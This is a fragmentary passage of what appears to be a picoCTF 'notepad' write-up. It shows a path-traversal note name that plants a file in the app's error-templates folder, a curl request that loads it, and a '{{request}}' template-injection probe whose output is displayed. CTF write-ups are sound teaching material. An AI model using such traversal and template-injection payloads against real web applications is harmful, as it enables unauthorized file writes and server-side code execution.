...
```
..\templates\errors\[AWS_SECRET_REMOVED][AWS_SECRET_REMOVED]aaaaaaaaaaaaaaaaaaaaaabcdefg
This is a test
```
...
After posting this note, we get redirected to `https://notepad.mars.picoctf.[AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED]aaabcdefg-fY1TxE2Zt-M.html`. So we take the HTML file name, and visit:

```console
┌──(user@kali)-[/media/sf_CTFs/pico/notepad]
└─$ curl https://notepad.mars.picoctf.net/?error=[AWS_SECRET_REMOVED][AWS_SECRET_REMOVED]aaaaaaaaaaaaaaaaaaaaaabcdefg-fY1TxE2Zt-M
<!doctype html>

  <h3>
    error: [AWS_SECRET_REMOVED][AWS_SECRET_REMOVED]aaaaaaaaaaaaaaaaaaaaaabcdefg-fY1TxE2Zt-M
  </h3>
  ..\templates\errors\[AWS_SECRET_REMOVED][AWS_SECRET_REMOVED]aaaaaaaaaaaaaaaaaaaaaabcdefg
This is a test
...
```
(Cmd) send {{request}}
<Request 'http://notepad.mars.picoctf.net/?error=[AWS_SECRET_REMOVED][AWS_SECRET_REMOVED]aaaaaaaaaaaaaaaaaaaaaaaaaaaa-8YBEL1R-vo4' [GET]>
```
